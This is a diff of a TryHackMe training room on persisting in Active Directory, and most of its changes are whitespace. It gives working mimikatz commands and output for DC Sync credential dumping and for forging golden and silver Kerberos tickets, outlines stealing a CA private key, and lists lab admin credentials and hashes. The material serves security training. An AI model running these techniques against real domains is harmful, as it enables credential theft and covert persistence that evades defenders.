@@ -2,17 +2,15 @@
 
 ---
 
-This network is the continuation of the [Breaching AD](https://tryhackme.com/jr/breachingad), [Enumerating AD](http://tryhackme.com/jr/adenumeration), and [Exploiting AD](https://tryhackme.com/jr/exploitingad) networks. Please make sure to complete these networks before continuing with this one. Also, note that we will discuss AD objects extensively. If you need a refresher, have a quick reskim of [this room.](https://tryhackme.com/jr/activedirectorybasics) Now that we have exploited AD and achieved some positions from which we can execute our goals, we need to make sure that we deploy persistence to make sure the blue team can't just kick us out. In this network, we will explore several different methods that could be used to persist in AD.Â   
+This network is the continuation of the [Breaching AD](https://tryhackme.com/jr/breachingad), [Enumerating AD](http://tryhackme.com/jr/adenumeration), and [Exploiting AD](https://tryhackme.com/jr/exploitingad) networks. Please make sure to complete these networks before continuing with this one. Also, note that we will discuss AD objects extensively. If you need a refresher, have a quick reskim of [this room.](https://tryhackme.com/jr/activedirectorybasics) Now that we have exploited AD and achieved some positions from which we can execute our goals, we need to make sure that we deploy persistence to make sure the blue team can't just kick us out. In this network, we will explore several different methods that could be used to persist in AD. ## AD Persistence
 
-## AD Persistence
+During our attack against AD, we need to make sure that we deploy persistence. This will ensure that the blue team can't kick us out by simply rotating some credentials. As mentioned before, the process of compromising AD is cyclic. We would deploy persistence as we compromise the AD estate and not just at the very end. This ensures that if one of our positions gets burnt by the blue team, we have several fallbacks. In this persistence phase, we will use several techniques that can ensure our gained access cannot simply be revoked. These persistence techniques are dependent on the specific permissions and privileges we have acquired thus far. 
 
-During our attack against AD, we need to make sure that we deploy persistence. This will ensure that the blue team can't kick us out by simply rotating some credentials. As mentioned before, the process of compromising AD is cyclic. We would deploy persistence as we compromise the AD estate and not just at the very end. This ensures that if one of our positions gets burnt by the blue team, we have several fallbacks. In this persistence phase, we will use several techniques that can ensure our gained access cannot simply be revoked. These persistence techniques are dependent on the specific permissions and privileges we have acquired thus far.  
+ 
 
-  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e9bfa3b741afc09bb7a088746c18bf5a.png) 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e9bfa3b741afc09bb7a088746c18bf5a.png)  
-
-## Learning Objectives  
+## Learning Objectives 
 
 In this network, we will cover several methods that can be used to persist in AD. This is by no means a complete list, as available methods are usually highly situational and dependent on the AD structure and environment. However, we will cover the following techniques for persisting AD:
 
@@ -23,9 +21,9 @@ In this network, we will cover several methods that can be used to persist in AD
 - Access Control Lists
 - Group Policy Objects (GPOs)
 
-Connection to the Network  
+Connection to the Network 
 
-**AttackBox**  
+**AttackBox** 
 
 If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.loc host. **Note that the suffix for this network and the exploiting AD network is .loc and not .com.** We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:
 
@@ -33,7 +31,7 @@ If you are using the Web-based AttackBox, you will be connected to the network a
 ```shell-session
 sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
-      
+ 
 
 Remember to replace $THMDCIP with the IP of THMDC in your network diagram. You can test that DNS is working by running:
 
@@ -41,22 +39,22 @@ Remember to replace $THMDCIP with the IP of THMDC in your network diagram. You c
 
 This should resolve to the IP of your DC.
 
-**Note: DNS may be reset on the AttackBox roughly every 3 hours. If this occurs, you will have to redo the command above. If your AttackBox terminates and you continue with the room at a later stage, you will have to redo all the DNS steps.**  
+**Note: DNS may be reset on the AttackBox roughly every 3 hours. If this occurs, you will have to redo the command above. If your AttackBox terminates and you continue with the room at a later stage, you will have to redo all the DNS steps.** 
 
 You should also take the time to make note of your VPN IP. Using `ifconfig` or `ip a`, make note of the IP of the **persistad** network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks.
 
-**Other Hosts**  
+**Other Hosts** 
 
 If you are going to use your own attack machine, an OpenVPN configuration file will have been generated for you once you join the room. Go to your [access](https://tryhackme.com/access) page. Select 'PersistingAD' from the VPN servers (under the network tab) and download your configuration file.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/89d305d7a8a1567dda28091eb9149e3f.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/89d305d7a8a1567dda28091eb9149e3f.png) 
 
-Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/r/access) page.  
+Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/r/access) page. 
 
 ```markup
 [thm@thm]$ sudo openvpn persistingad.ovpn
 Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
-Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS  21 Apr 2020, LZO 2.08
+Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS 21 Apr 2020, LZO 2.08
 [....]
 Fri Mar 11 15:06:22 2022 /sbin/ip link set dev tun0 up mtu 1500
 Fri Mar 11 15:06:22 2022 /sbin/ip addr add dev tun0 10.50.2.3/24 broadcast 10.50.2.255
@@ -64,11 +62,11 @@ Fri Mar 11 15:06:22 2022 /sbin/ip route add 10.200.4.0/24 metric 1000 via 10.50.
 Fri Mar 11 15:06:22 2022 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this
 Fri Mar 11 15:06:22 2022 Initialization Sequence Completed
 ```
-      
+ 
 
 The message "Initialization Sequence Completed" tells you that you are now connected to the network. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page, and you should see a green tick next to Connected. It will also show you your internal IP address.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/96d771ea06e59f420ad185ea6438b0a1.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/96d771ea06e59f420ad185ea6438b0a1.png) 
 
 **Note:** You still have to configure DNS similar to what was shown above. It is important to note that although not used, the DC does log DNS requests. If you are using your machine, these logs may include the hostname of your device.
 
@@ -77,7 +75,7 @@ The message "Initialization Sequence Completed" tells you that you are now conne
 If you are using a Kali VM, Network Manager is most likely used as DNS manager. You can use GUI Menu to configure DNS:
 
 - Network Manager -> Advanced Network Configuration -> Your Connection -> IPv4 Settings
-- Set your DNS IP here to the IP for THMCHILDDC in the network diagram above  
+- Set your DNS IP here to the IP for THMCHILDDC in the network diagram above 
 - Add another DNS such as 1.1.1.1 or similar to ensure you still have internet access
 - Run `sudo systemctl restart NetworkManager` and test your DNS similar to the steps above.
 
@@ -85,7 +83,7 @@ If you are using a Kali VM, Network Manager is most likely used as DNS manager. 
 
 To simulate an AD breach, you will be provided with your first set of AD credentials. Once your networking setup has been completed, on your Attack Box, navigate to [http://distributor.za.tryhackme.loc/creds](http://distributor.za.tryhackme.loc/creds) to request your credential pair. Click the "Get Credentials" button to receive your credential pair that can be used for initial access.
 
-This credential pair will provide you RDP and SSH access to THMWRK1.za.tryhackme.loc. THMWRK1 can be seen as a jump host into this environment, simulating a foothold that you have achieved. Jump hosts are often targeted by the red team since they provide access to a new network segment. You can use Remmina or any other similar Remote Desktop client to connect to this host for RDP. Remember to specify the domain of za.tryhackme.loc when connecting.  
+This credential pair will provide you RDP and SSH access to THMWRK1.za.tryhackme.loc. THMWRK1 can be seen as a jump host into this environment, simulating a foothold that you have achieved. Jump hosts are often targeted by the red team since they provide access to a new network segment. You can use Remmina or any other similar Remote Desktop client to connect to this host for RDP. Remember to specify the domain of za.tryhackme.loc when connecting. 
 
 For SSH access, you can use the following SSH command:
 
@@ -138,7 +136,7 @@ Let's proceed.
 
 ## Congratulations
 
-Congratulations weary traveler! After breaching AD, performing enumeration, and exploiting it all the way to the top (if you have done these AD networks in order), you have finally made it to the tavern of persistence. The hard work is over and it is now time for some fun. While AD persistence is still serious business, it is really not as stressful as the other phases. Here we can let our creativity flow free. So rest your weary bones in our tavern, get yourself a nice cup of tea and let's begin.  
+Congratulations weary traveler! After breaching AD, performing enumeration, and exploiting it all the way to the top (if you have done these AD networks in order), you have finally made it to the tavern of persistence. The hard work is over and it is now time for some fun. While AD persistence is still serious business, it is really not as stressful as the other phases. Here we can let our creativity flow free. So rest your weary bones in our tavern, get yourself a nice cup of tea and let's begin. 
 
 Together with your low-privileged credentials, you will be provided with Domain Administrator credentials. What luck! When discussing persistence techniques, you will use the privileged credentials to perform the persistence technique on your low-privileged credential set. Make a note of the following DA account:
 
@@ -146,9 +144,9 @@ Username: `Administrator`
 
 Password: `tryhackmewouldnotguess1@`
 
-Domain: `ZA`  
+Domain: `ZA` 
 
-Since we provide your with full access over the entire domain, we can't really hide any flags or force you to make sure you perform these persistence techniques yourself before answering the questions. It is however encouraged that you take your time to work through these methods, as they will pay dividends in return on a red team assessment when the blue team starts kicking you out.  
+Since we provide your with full access over the entire domain, we can't really hide any flags or force you to make sure you perform these persistence techniques yourself before answering the questions. It is however encouraged that you take your time to work through these methods, as they will pay dividends in return on a red team assessment when the blue team starts kicking you out. 
 
 The first and least reliable persistence technique that we will discuss is credentials. Several of the lateral techniques discussed in previous rooms would have resulted in the attacker gaining access to credentials. When using the word credentials, it can mean a username and password pair, but in the context of AD, even the password hash is sufficient for authentication through pass-the-hash techniques.
 
@@ -162,7 +160,7 @@ The process of replication is called DC Synchronisation. It is not just the DCs 
 
 A popular attack to perform is a DC Sync attack. If we have access to an account that has domain replication permissions, we can stage a DC Sync attack to harvest credentials from a DC.
 
-## Not All Credentials Are Created Equal  
+## Not All Credentials Are Created Equal 
 
 Before starting our DC Sync attack, let's first discuss what credentials we could potentially hunt for. While we should always look to dump privileged credentials such as those that are members of the Domain Admins group, these are also the credentials that will be rotated (a blue team term meaning to reset the account's password) first. As such, if we only have privileged credentials, it is safe to say as soon as the blue team discovers us, they will rotate those accounts, and we can potentially lose our access.
 
@@ -184,12 +182,12 @@ Microsoft Windows [Version 10.0.17763.1098]
 
 za\administrator@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
+ .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
+ .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
+ ## \ / ## > https://blog.gentilkiwi.com/mimikatz
+ '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) 
+ '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ 
 
 mimikatz #
 ```
@@ -201,31 +199,31 @@ mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD
 [DC] 'za.tryhackme.loc' will be the domain
 [DC] 'THMDC.za.tryhackme.loc' will be the DC server 
 [DC] 'aaron.jones' will be the user account
-[rpc] Service  : ldap
+[rpc] Service : ldap
 [rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
-Object RDN           : aaron.jones 
+Object RDN : aaron.jones 
 
 ** SAM ACCOUNT **
 
-SAM Username         : aaron.jones
-Account Type         : 30000000 ( USER_OBJECT )    
+SAM Username : aaron.jones
+Account Type : 30000000 ( USER_OBJECT ) 
 User Account Control : 00000200 ( NORMAL_ACCOUNT ) 
-Account expiration   :
+Account expiration :
 Password last change : 4/25/2022 7:30:21 PM
-Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429 
-Object Relative ID   : 1429
+Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-1429 
+Object Relative ID : 1429
 
 Credentials:
-  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
-    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
-    lm  - 0: 0fd2685aa18c78bd265d02bdec203b04 
+ Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
+ ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
+ lm - 0: 0fd2685aa18c78bd265d02bdec203b04 
 
 [...]
 
 * Primary:WDigest * 
-    01  991d45386dd3561e0c5529d3605f96e6
-    02  d5d6f25b233c87b289706d7b423f1145
+ 01 991d45386dd3561e0c5529d3605f96e6
+ 02 d5d6f25b233c87b289706d7b423f1145
 [...]
 ```
 
@@ -325,11 +323,11 @@ We got our hash:
 
 As discussed in the previous tasks, we often want to persist through service accounts with delegation permissions to forge silver and golden tickets. But what are those exactly, and why does every blue team tabletop exercise end with someone shouting: "Flush all golden and silver tickets!".
 
-## Tickets to the Chocolate Factory  
+## Tickets to the Chocolate Factory 
 
 Before getting into golden and silver tickets, we first just need to do a quick recap on Kerberos authentication. The diagram below shows the normal flow for Kerberos authentication:
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d8b0bf2303eb0486da1737ac6a07da51.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d8b0bf2303eb0486da1737ac6a07da51.png) 
 
 The user makes an AS-REQ to the Key Distribution Centre (KDC) on the DC that includes a timestamp encrypted with the user's NTLM hash. Essentially, this is the request for a Ticket Granting Ticket (TGT). The DC checks the information and sends the TGT to the user. This TGT is signed with the KRBTGT account's password hash that is only stored on the DC. The user can now send this TGT to the DC to request a Ticket Granting Service (TGS) for the resource that the user wants to access. If the TGT checks out, the DC responds to the TGS that is encrypted with the NTLM hash of the service that the user is requesting access for. The user then presents this TGS to the service for access, which can verify the TGS since it knows its own hash and can grant the user access.
 
@@ -354,14 +352,14 @@ Apart from the KRBTGT account's password hash, we only need the domain name, dom
 
 Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets:
 
-- The generated TGS is signed by the machine account of the host we are targeting.  
-- The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.  
+- The generated TGS is signed by the machine account of the host we are targeting. 
+- The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server. 
 - Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
-- Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.   
+- Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group. 
 - The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
-- While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.  
+- While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account. 
 
-## Forging Tickets for Fun and Profit  
+## Forging Tickets for Fun and Profit 
 
 Now that we have explained the basics for Golden and Silver Tickets, let's generate some. You will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that you performed. The last piece of information we need is the Domain SID. Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information:
 
@@ -373,35 +371,35 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\Users\Administrator.ZA> Get-ADDomain
 
 
-AllowedDNSSuffixes                 : {}
-ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
-DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
-DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
-DNSRoot                            : za.tryhackme.loc
-DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
-DomainMode                         : Windows2012R2Domain
-DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
+AllowedDNSSuffixes : {}
+ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc
+DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
+DistinguishedName : DC=za,DC=tryhackme,DC=loc
+DNSRoot : za.tryhackme.loc
+DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
+DomainMode : Windows2012R2Domain
+DomainSID : S-1-5-21-3885271727-2693558621-2658995185
 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
-Forest                             : tryhackme.loc
-InfrastructureMaster               : THMDC.za.tryhackme.loc
-LastLogonReplicationInterval       :
-LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
-LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
-ManagedBy                          :
-Name                               : za
-NetBIOSName                        : ZA
-ObjectClass                        : domainDNS
-ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
-ParentDomain                       : tryhackme.loc
-PDCEmulator                        : THMDC.za.tryhackme.loc
-PublicKeyRequiredPasswordRolling   :
-QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
-ReadOnlyReplicaDirectoryServers    : {}
-ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
-RIDMaster                          : THMDC.za.tryhackme.loc
-SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
-SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
-UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
+Forest : tryhackme.loc
+InfrastructureMaster : THMDC.za.tryhackme.loc
+LastLogonReplicationInterval :
+LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
+LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
+ManagedBy :
+Name : za
+NetBIOSName : ZA
+ObjectClass : domainDNS
+ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2
+ParentDomain : tryhackme.loc
+PDCEmulator : THMDC.za.tryhackme.loc
+PublicKeyRequiredPasswordRolling :
+QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
+ReadOnlyReplicaDirectoryServers : {}
+ReplicaDirectoryServers : {THMDC.za.tryhackme.loc}
+RIDMaster : THMDC.za.tryhackme.loc
+SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
+SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc
+UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc
 ```
 
 Now that we have all the required information, we can relaunch Mimikatz:
@@ -409,12 +407,12 @@ Now that we have all the required information, we can relaunch Mimikatz:
 ```markup
 za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
+ .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
+ .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
+ ## \ / ## > https://blog.gentilkiwi.com/mimikatz
+ '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) 
+ '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ 
 
 mimikatz #
 ```
@@ -427,14 +425,14 @@ mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.l
 
 Parameters explained:
 
-- **/admin** - The username we want to impersonate. This does not have to be a valid user.  
-- **/domain** - The FQDN of the domain we want to generate the ticket for.  
-- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
+- **/admin** - The username we want to impersonate. This does not have to be a valid user. 
+- **/domain** - The FQDN of the domain we want to generate the ticket for. 
+- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID. 
 - **/sid** -The SID of the domain we want to generate the ticket for.
-- **/krbtgt** -The NTLM hash of the KRBTGT account.  
-- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
-- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
-- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.     
+- **/krbtgt** -The NTLM hash of the KRBTGT account. 
+- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes) 
+- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes) 
+- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used. 
 
 We can verify that the golden ticket is working by running the dir command against the domain controller:
 
@@ -451,13 +449,13 @@ mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.lo
 
 Parameters explained:
 
-- **/admin** - The username we want to impersonate. This does not have to be a valid user.  
-- **/domain** - The FQDN of the domain we want to generate the ticket for.  
-- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
+- **/admin** - The username we want to impersonate. This does not have to be a valid user. 
+- **/domain** - The FQDN of the domain we want to generate the ticket for. 
+- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID. 
 - **/sid** -The SID of the domain we want to generate the ticket for.
-- **/target** - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.  
-- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.  
-- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.  
+- **/target** - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host. 
+- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account. 
+- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access. 
 - **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
 
 We can verify that the silver ticket is working by running the dir command against THMSERVER1:
@@ -491,37 +489,37 @@ We will get this:
 PS C:\Users\chloe.potter> Get-ADDomain
 
 
-AllowedDNSSuffixes                 : {}
-ChildDomains                       : {}
-ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
-DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
-DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
-DNSRoot                            : za.tryhackme.loc
-DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
-DomainMode                         : Windows2012R2Domain
-DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
+AllowedDNSSuffixes : {}
+ChildDomains : {}
+ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc
+DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
+DistinguishedName : DC=za,DC=tryhackme,DC=loc
+DNSRoot : za.tryhackme.loc
+DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
+DomainMode : Windows2012R2Domain
+DomainSID : S-1-5-21-3885271727-2693558621-2658995185
 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
-Forest                             : tryhackme.loc
-InfrastructureMaster               : THMDC.za.tryhackme.loc
-LastLogonReplicationInterval       :
-LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=
-                                     System,DC=za,DC=tryhackme,DC=loc}
-LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
-ManagedBy                          :
-Name                               : za
-NetBIOSName                        : ZA
-ObjectClass                        : domainDNS
-ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
-ParentDomain                       : tryhackme.loc
-PDCEmulator                        : THMDC.za.tryhackme.loc
-PublicKeyRequiredPasswordRolling   :
-QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
-ReadOnlyReplicaDirectoryServers    : {}
-ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
-RIDMaster                          : THMDC.za.tryhackme.loc
-SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
-SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
-UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
+Forest : tryhackme.loc
+InfrastructureMaster : THMDC.za.tryhackme.loc
+LastLogonReplicationInterval :
+LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=
+ System,DC=za,DC=tryhackme,DC=loc}
+LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
+ManagedBy :
+Name : za
+NetBIOSName : ZA
+ObjectClass : domainDNS
+ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2
+ParentDomain : tryhackme.loc
+PDCEmulator : THMDC.za.tryhackme.loc
+PublicKeyRequiredPasswordRolling :
+QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
+ReadOnlyReplicaDirectoryServers : {}
+ReplicaDirectoryServers : {THMDC.za.tryhackme.loc}
+RIDMaster : THMDC.za.tryhackme.loc
+SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
+SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc
+UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc
 ```
 
 Now that we have the info, let's launch mimikatz again, same as before since it can crash:
@@ -562,7 +560,7 @@ The last two persistence techniques relied on credentials. While we can definite
 
 In the [Exploiting AD](http://tryhackme.com/jr/exploitingad) room, we leveraged certificates to become Domain Admins. However, certificates can also be used for persistence. All we need is a valid certificate that can be used for Client Authentication. This will allow us to use the certificate to request a TGT. The beauty of this? We can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning we probably have persistent access by default for roughly the next 5 years.
 
-If you are interested in a refresh about requesting a certificate and using it for Kerberos authentication, please go to either the [Exploiting AD](http://tryhackme.com/jr/exploitingad) or [AD Certificates Template](http://tryhackme.com/jr/adcertificatetemplates) room. However, in this room, we are not messing around. We are going after the Certificate Authority (CA) itself.  
+If you are interested in a refresh about requesting a certificate and using it for Kerberos authentication, please go to either the [Exploiting AD](http://tryhackme.com/jr/exploitingad) or [AD Certificates Template](http://tryhackme.com/jr/adcertificatetemplates) room. However, in this room, we are not messing around. We are going after the Certificate Authority (CA) itself. 
 
 Depending on our access, we can take it another step further. We could simply steal the private key of the root CA's certificate to generate our own certificates whenever we feel like it. Even worse, since these certificates were never issued by the CA, the blue team has no ability to revoke them. This would be even worse for the blue team since it would mean a rotation of the CA, meaning all issued certificates would have to be revoked by the blue team to kick us out. Imagine you've just spent the last two days performing a domain takeback by rotating the credentials of every single privileges account, resetting all the golden and silver tickets, just to realise the attackers persisted by becoming your CA. Yikes!
 
@@ -575,12 +573,12 @@ za\administrator@DC C:\Users\Administrator.ZA>mkdir <username>
 za\administrator@DC C:\Users\Administrator.ZA>cd <username>
 za\administrator@DC C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
